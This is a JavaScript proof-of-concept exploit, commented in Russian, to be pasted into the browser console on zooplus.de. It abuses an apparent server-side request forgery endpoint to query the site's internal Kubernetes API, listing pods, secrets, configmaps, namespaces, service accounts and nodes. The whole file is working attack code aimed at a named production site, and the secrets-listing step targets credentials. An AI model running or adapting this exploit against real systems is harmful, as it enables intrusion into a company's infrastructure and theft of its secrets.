// PoC: SSRF to Kubernetes API
// Выполнить в консоли браузера на zooplus.de

console.log("%c[POC] SSRF to Kubernetes API", "color:red;font-size:20px;font-weight:bold");
console.log("=".repeat(70));

const ssrfEndpoint = "https://www.zooplus.de/zootopia-events/api/events/sites/1";
const k8sBase = "https://kubernetes.default.svc";

// Test 1: List Pods
console.log("\n[1] Testing: List Pods in default namespace...");
fetch(ssrfEndpoint, {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({
    url: `${k8sBase}/api/v1/namespaces/default/pods`
  })
})
.then(r => r.text())
.then(t => {
  console.log("%c[RESPONSE] Pods:", "color:green;font-size:16px");
  console.log(t);
  if (t.includes("items") || t.includes("kind") || t.includes("metadata")) {
    console.log("%c[SUCCESS] Kubernetes API accessible! Got pods data!", "color:red;font-size:18px;font-weight:bold");
    try {
      const data = JSON.parse(t);
      if (data.items) {
        console.log(`Found ${data.items.length} pods`);
        data.items.forEach((pod, i) => {
          console.log(`  Pod ${i+1}: ${pod.metadata.name} (${pod.metadata.namespace})`);
        });
      }
    } catch(e) {}
  }
})
.catch(e => console.error("[ERROR]", e));

// Test 2: List Secrets
setTimeout(() => {
  console.log("\n[2] Testing: List Secrets in default namespace...");
  fetch(ssrfEndpoint, {
    method: "POST",
    credentials: "include",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      url: `${k8sBase}/api/v1/namespaces/default/secrets`
    })
  })
  .then(r => r.text())
  .then(t => {
    console.log("%c[RESPONSE] Secrets:", "color:green;font-size:16px");
    console.log(t);
    if (t.includes("items") || t.includes("kind") || t.includes("secret")) {
      console.log("%c[SUCCESS] Secrets accessible!", "color:red;font-size:18px;font-weight:bold");
      try {
        const data = JSON.parse(t);
        if (data.items) {
          console.log(`Found ${data.items.length} secrets`);
          data.items.forEach((secret, i) => {
            console.log(`  Secret ${i+1}: ${secret.metadata.name}`);
          });
        }
      } catch(e) {}
    }
  })
  .catch(e => console.error("[ERROR]", e));
}, 2000);

// Test 3: List ConfigMaps
setTimeout(() => {
  console.log("\n[3] Testing: List ConfigMaps in default namespace...");
  fetch(ssrfEndpoint, {
    method: "POST",
    credentials: "include",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      url: `${k8sBase}/api/v1/namespaces/default/configmaps`
    })
  })
  .then(r => r.text())
  .then(t => {
    console.log("%c[RESPONSE] ConfigMaps:", "color:green;font-size:16px");
    console.log(t);
    if (t.includes("items") || t.includes("kind")) {
      console.log("%c[SUCCESS] ConfigMaps accessible!", "color:red;font-size:18px;font-weight:bold");
    }
  })
  .catch(e => console.error("[ERROR]", e));
}, 4000);

// Test 4: List All Namespaces
setTimeout(() => {
  console.log("\n[4] Testing: List All Namespaces...");
  fetch(ssrfEndpoint, {
    method: "POST",
    credentials: "include",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      url: `${k8sBase}/api/v1/namespaces`
    })
  })
  .then(r => r.text())
  .then(t => {
    console.log("%c[RESPONSE] Namespaces:", "color:green;font-size:16px");
    console.log(t);
    if (t.includes("items") || t.includes("kind")) {
      console.log("%c[SUCCESS] Namespaces accessible!", "color:red;font-size:18px;font-weight:bold");
      try {
        const data = JSON.parse(t);
        if (data.items) {
          console.log(`Found ${data.items.length} namespaces`);
          data.items.forEach((ns, i) => {
            console.log(`  Namespace ${i+1}: ${ns.metadata.name}`);
          });
        }
      } catch(e) {}
    }
  })
  .catch(e => console.error("[ERROR]", e));
}, 6000);

// Test 5: List Service Accounts
setTimeout(() => {
  console.log("\n[5] Testing: List Service Accounts...");
  fetch(ssrfEndpoint, {
    method: "POST",
    credentials: "include",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      url: `${k8sBase}/api/v1/namespaces/default/serviceaccounts`
    })
  })
  .then(r => r.text())
  .then(t => {
    console.log("%c[RESPONSE] Service Accounts:", "color:green;font-size:16px");
    console.log(t);
    if (t.includes("items") || t.includes("kind")) {
      console.log("%c[SUCCESS] Service Accounts accessible!", "color:red;font-size:18px;font-weight:bold");
    }
  })
  .catch(e => console.error("[ERROR]", e));
}, 8000);

// Test 6: List Nodes
setTimeout(() => {
  console.log("\n[6] Testing: List Nodes...");
  fetch(ssrfEndpoint, {
    method: "POST",
    credentials: "include",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      url: `${k8sBase}/api/v1/nodes`
    })
  })
  .then(r => r.text())
  .then(t => {
    console.log("%c[RESPONSE] Nodes:", "color:green;font-size:16px");
    console.log(t);
    if (t.includes("items") || t.includes("kind")) {
      console.log("%c[SUCCESS] Nodes accessible!", "color:red;font-size:18px;font-weight:bold");
    }
  })
  .catch(e => console.error("[ERROR]", e));
}, 10000);

console.log("\n[INFO] All tests started. Check console for results...");





